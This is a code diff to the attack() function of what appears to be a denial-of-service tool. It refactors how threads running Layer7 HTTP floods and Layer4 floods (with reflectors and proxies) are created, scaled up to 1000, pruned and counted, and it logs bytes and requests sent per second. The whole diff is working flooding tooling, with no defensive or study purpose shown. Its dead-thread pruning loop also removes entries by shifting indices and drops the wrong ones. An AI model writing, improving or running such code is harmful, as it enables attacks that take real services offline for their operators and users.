@@ -162,7 +162,8 @@ def attack(
     THREADS_MAX_LIMIT = 1000
     THREADS_MIN_LIMIT = 1
     THREADS_STEP = 10
-    thread_stop_events: List[Event] = []
+    attack_threads: List[Thread] = []
+    attack_threads_stop_events: List[Event] = []
 
     # INITIALIZE THREAD MANAGEMENT FUNCTIONS
     def start_new_attack_thread():
@@ -172,36 +173,69 @@ def attack(
         # TODO: select random attack method from the list (when there will be multiple)
         selected_attack_method = attack_method
 
+        attack_thread = None
         if selected_attack_method in Methods.LAYER7_METHODS:
-            Layer7(target.url, target.ip, selected_attack_method, UNLIMITED_RPC, stop_event, user_agents, referrers, validated_proxies, cntr_rolling_bytes, cntr_rolling_requests, cntr_last_request_timestamp).start()
+            attack_thread = Layer7(
+                target=target.url,
+                host=target.ip,
+                method=selected_attack_method,
+                rpc=UNLIMITED_RPC,
+                synevent=stop_event,
+                useragents=user_agents,
+                referers=referrers,
+                proxies=validated_proxies,
+                bytes_sent_counter=cntr_rolling_bytes,
+                requests_sent_counter=cntr_rolling_requests,
+                last_request_timestamp=cntr_last_request_timestamp
+            )
         elif selected_attack_method in Methods.LAYER4_METHODS:
             selected_proxies = validated_proxies if selected_attack_method in Methods.WHICH_SUPPORT_PROXIES else None
-            Layer4((target.ip, target.port), reflectors, selected_attack_method, stop_event, selected_proxies, cntr_rolling_bytes, cntr_rolling_requests, cntr_last_request_timestamp).start()
+            attack_thread = Layer4(
+                target=(target.ip, target.port),
+                ref=reflectors,
+                method=selected_attack_method,
+                synevent=stop_event,
+                proxies=selected_proxies,
+                bytes_sent_counter=cntr_rolling_bytes,
+                requests_sent_counter=cntr_rolling_requests,
+                last_request_timestamp=cntr_last_request_timestamp
+            )
+        else:
+            exit(f"Invalid attack method ('{selected_attack_method}') selected when starting attack thread. Aborting execution.")
 
-        thread_stop_events.append(stop_event)
+        attack_threads.append(attack_thread)
+        attack_threads_stop_events.append(stop_event)
+
+        attack_thread.start()
         stop_event.set()
 
     def stop_attack_thread():
-        if len(thread_stop_events) == 0:
+        if len(attack_threads_stop_events) == 0:
             return
 
-        thread_to_stop_event = thread_stop_events.pop()
+        thread_to_stop_event = attack_threads_stop_events.pop()
         thread_to_stop_event.clear()
-
-    def running_threads_count() -> int:
-        return len(thread_stop_events)
 
     def increase_attack_threads():
         for _ in range(THREADS_STEP):
-            if running_threads_count() >= THREADS_MAX_LIMIT:
+            if get_running_threads_count() >= THREADS_MAX_LIMIT:
                 break
             start_new_attack_thread()
 
     def decrease_attack_threads():
         for _ in range(THREADS_STEP):
-            if running_threads_count() <= THREADS_MIN_LIMIT:
+            if get_running_threads_count() <= THREADS_MIN_LIMIT:
                 break
             stop_attack_thread()
+
+    def get_running_threads_count() -> int:
+        # clear any dead threads from the list
+        for i, t in enumerate(attack_threads.copy()):
+            if not t.is_alive():
+                attack_threads_stop_events.pop(i)
+                attack_threads.pop(i)
+
+        return len(attack_threads_stop_events)
 
     # INITIALIZE STATUS UPDATE FUNCTION
     def post_status_update():
@@ -211,7 +245,7 @@ def attack(
         attack_status = AttackState(
             attack_pid=process.pid,
 
-            active_threads_count=running_threads_count(),
+            active_threads_count=get_running_threads_count(),
             cpu_usage=cpu_usage,
 
             proxy_validation_state=proxies_validation_state,
@@ -328,7 +362,7 @@ def attack(
         tp_string = Tools.humanformat(int(tp))
         tb_string = Tools.humanbytes(int(tb))
         logger.info(f"Total bytes sent: {tb_string}, total requests: {tp_string}, BPS: {bps_string}/s, PPS: {pps_string} p/s, tslr: {tslr*1000:.0f} ms "
-                    f"active threads: {len(thread_stop_events)}, cpu: {cpu_usage}%")
+                    f"active threads: {len(attack_threads_stop_events)}, cpu: {cpu_usage}%")
 
 
 def start():
